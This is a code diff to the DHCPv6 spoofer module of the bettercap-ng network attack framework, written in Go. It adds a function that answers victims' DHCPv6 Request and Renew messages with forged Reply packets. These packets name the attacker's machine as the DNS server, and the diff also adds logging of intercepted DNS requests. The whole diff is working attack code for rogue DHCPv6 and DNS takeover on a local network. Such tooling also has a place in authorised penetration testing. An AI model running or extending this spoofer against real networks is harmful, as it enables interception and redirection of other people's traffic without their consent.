@@ -1,8 +1,11 @@
 package modules
 
 import (
+	"bytes"
 	"crypto/rand"
+	"fmt"
 	"net"
+	"strings"
 	"time"
 
 	"github.com/evilsocket/bettercap-ng/core"
@@ -22,9 +25,10 @@ import (
 
 type DHCP6Spoofer struct {
 	session.SessionModule
-	Handle *pcap.Handle
-	DUID   *dhcp6opts.DUIDLLT
-	Domain string
+	Handle  *pcap.Handle
+	DUID    *dhcp6opts.DUIDLLT
+	DUIDRaw []byte
+	Domain  string
 }
 
 func NewDHCP6Spoofer(s *session.Session) *DHCP6Spoofer {
@@ -83,6 +87,8 @@ func (s *DHCP6Spoofer) Configure() error {
 
 	if s.DUID, err = dhcp6opts.NewDUIDLLT(1, time.Date(2000, time.January, 1, 0, 0, 0, 0, time.UTC), s.Session.Interface.HW); err != nil {
 		return err
+	} else if s.DUIDRaw, err = s.DUID.MarshalBinary(); err != nil {
+		return err
 	}
 
 	return nil
@@ -139,16 +145,9 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 
 	lenDomain := len(s.Domain)
 	rawDomain := append([]byte{byte(lenDomain & 0xff)}, []byte(s.Domain)...)
-
 	adv.Options.AddRaw(DHCP6OptDNSDomains, rawDomain)
 	adv.Options.AddRaw(DHCP6OptDNSServers, s.Session.Interface.IPv6)
-
-	rawDUID, err := s.DUID.MarshalBinary()
-	if err != nil {
-		log.Error("%s", err)
-		return
-	}
-	adv.Options.AddRaw(dhcp6.OptionServerID, rawDUID)
+	adv.Options.AddRaw(dhcp6.OptionServerID, s.DUIDRaw)
 
 	var rawCID []byte
 	if raw, found := solicit.Options[dhcp6.OptionClientID]; found == false || len(raw) < 1 {
@@ -163,19 +162,21 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 	if t, found := s.Session.Targets.Targets[target.String()]; found == true {
 		ip = t.IP
 	} else {
-		log.Debug("Address %s not known, using random identity association address.", target.String())
+		log.Warning("Address %s not known, using random identity association address.", target.String())
 		rand.Read(ip)
 	}
 
-	iaaddr, err := dhcp6opts.NewIAAddr(ip, 300*time.Second, 300*time.Second, nil)
+	addr := fmt.Sprintf("%s%s", IPv6Prefix, strings.Replace(ip.String(), ".", ":", -1))
+
+	iaaddr, err := dhcp6opts.NewIAAddr(net.ParseIP(addr), 300*time.Second, 300*time.Second, nil)
 	if err != nil {
-		log.Error("%s", err)
+		log.Error("Error creating IAAddr: %s", err)
 		return
 	}
 
 	iaaddrRaw, err := iaaddr.MarshalBinary()
 	if err != nil {
-		log.Error("%s", err)
+		log.Error("Error serializing IAAddr: %s", err)
 		return
 	}
 
@@ -183,7 +184,7 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 	iana := dhcp6opts.NewIANA(solIANA.IAID, 200*time.Second, 250*time.Second, opts)
 	ianaRaw, err := iana.MarshalBinary()
 	if err != nil {
-		log.Error("%s", err)
+		log.Error("Error serializing IANA: %s", err)
 		return
 	}
 
@@ -232,6 +233,102 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 	}
 }
 
+func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.Packet, target net.HardwareAddr) {
+	log.Debug("Sending spoofed DHCPv6 reply to %s after its %s packet.", core.Bold(target.String()), toType)
+
+	pktIp6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
+	reply := dhcp6.Packet{
+		MessageType:   dhcp6.MessageTypeReply,
+		TransactionID: req.TransactionID,
+		Options:       make(dhcp6.Options),
+	}
+
+	var reqIANA dhcp6opts.IANA
+	if raw, found := req.Options[dhcp6.OptionIANA]; found == false || len(raw) < 1 {
+		log.Error("Unexpected DHCPv6 packet, could not find IANA.")
+		return
+	} else if err := reqIANA.UnmarshalBinary(raw[0]); err != nil {
+		log.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
+		return
+	}
+
+	var rawCID []byte
+	if raw, found := req.Options[dhcp6.OptionClientID]; found == false || len(raw) < 1 {
+		log.Error("Unexpected DHCPv6 packet, could not find client id.")
+		return
+	} else {
+		rawCID = raw[0]
+	}
+
+	lenDomain := len(s.Domain)
+	rawDomain := append([]byte{byte(lenDomain & 0xff)}, []byte(s.Domain)...)
+	reply.Options.AddRaw(DHCP6OptDNSDomains, rawDomain)
+
+	reply.Options.AddRaw(dhcp6.OptionClientID, rawCID)
+	reply.Options.AddRaw(dhcp6.OptionServerID, s.DUIDRaw)
+	reply.Options.AddRaw(DHCP6OptDNSServers, s.Session.Interface.IPv6)
+
+	opts := dhcp6.Options{} //dhcp6.OptionIAAddr: [][]byte{iaaddrRaw}}
+	iana := dhcp6opts.NewIANA(reqIANA.IAID, 200*time.Second, 250*time.Second, opts)
+	ianaRaw, err := iana.MarshalBinary()
+	if err != nil {
+		log.Error("Error serializing IANA: %s", err)
+		return
+	}
+	reply.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)
+
+	rawAdv, err := reply.MarshalBinary()
+	if err != nil {
+		log.Error("Error serializing advertisement packet: %s.", err)
+		return
+	}
+
+	eth := layers.Ethernet{
+		SrcMAC:       s.Session.Interface.HW,
+		DstMAC:       target,
+		EthernetType: layers.EthernetTypeIPv6,
+	}
+
+	ip6 := layers.IPv6{
+		Version:    6,
+		NextHeader: layers.IPProtocolUDP,
+		HopLimit:   64,
+		SrcIP:      s.Session.Interface.IPv6,
+		DstIP:      pktIp6.SrcIP,
+	}
+
+	udp := layers.UDP{
+		SrcPort: 547,
+		DstPort: 546,
+	}
+
+	udp.SetNetworkLayerForChecksum(&ip6)
+
+	final := DHCPv6Layer{
+		Raw: rawAdv,
+	}
+
+	err, raw := packets.Serialize(&eth, &ip6, &udp, &final)
+	if err != nil {
+		log.Error("Error serializing packet: %s.", err)
+		return
+	}
+
+	log.Debug("Sending %d bytes of packet ...", len(raw))
+	if err := s.Session.Queue.Send(raw); err != nil {
+		log.Error("Error sending packet: %s", err)
+	}
+
+	if toType == "request" {
+		var addr net.IP
+		if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found == true {
+			addr = net.IP(raw[0])
+		}
+
+		log.Info("IPv6 address %s is now assigned to %s", addr.String(), target)
+	}
+}
+
 func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
 	var dhcp dhcp6.Packet
 	var err error
@@ -247,12 +344,30 @@ func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
 			s.dhcpAdvertise(pkt, dhcp, eth.SrcMAC)
 
 		case dhcp6.MessageTypeRequest:
-			log.Info("REQUEST %s", dhcp)
+			if raw, found := dhcp.Options[dhcp6.OptionServerID]; found == true && len(raw) >= 1 {
+				rawServerID := raw[0]
+				if bytes.Compare(rawServerID, s.DUIDRaw) == 0 {
+					s.dhcpReply("request", pkt, dhcp, eth.SrcMAC)
+				}
+			}
 
 		case dhcp6.MessageTypeRenew:
-			log.Info("RENEW %s", dhcp)
-
+			if raw, found := dhcp.Options[dhcp6.OptionServerID]; found == true && len(raw) >= 1 {
+				rawServerID := raw[0]
+				if bytes.Compare(rawServerID, s.DUIDRaw) == 0 {
+					s.dhcpReply("renew", pkt, dhcp, eth.SrcMAC)
+				}
+			}
 		}
+
+		return
+	}
+
+	// DNS request?
+	dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
+	if parsed == true {
+		log.Warning("Got DNS request!")
+		log.Info("%s", dns)
 	}
 }
 
